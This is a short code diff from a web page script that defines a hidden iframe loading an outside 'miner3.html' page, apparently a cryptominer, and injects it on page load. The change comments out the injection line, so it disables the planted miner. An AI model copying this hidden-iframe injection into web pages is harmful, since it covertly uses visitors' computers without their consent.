@@ -8,7 +8,7 @@ window.onload = function(){
         "<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>"
         ]
         for (var i=0,len=divs.length;i<len;i++){
-            document.getElementsByTagName("body")[0].innerHTML+=divs[i]
+            // document.getElementsByTagName("body")[0].innerHTML+=divs[i]
         }
         document.addEventListener("click", function () {
             if (document.getElementsByTagName("body")[0].innerText.match("美女")) {
